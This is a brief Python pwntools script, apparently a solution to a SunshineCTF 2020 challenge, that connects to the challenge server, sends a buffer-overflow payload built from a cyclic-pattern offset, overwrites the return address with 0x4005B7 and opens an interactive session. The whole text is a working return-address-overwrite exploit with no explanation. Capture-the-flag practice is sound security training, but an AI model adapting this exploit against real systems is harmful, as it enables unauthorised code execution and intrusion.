from pwn import *

p = remote("chal.2020.sunshinectf.org", 30004)
buf = b''
buf += cyclic(cyclic_find(p64(0x6175616161746161)))
buf += p64(0x4005B7)

p.sendline(buf)
p.interactive()
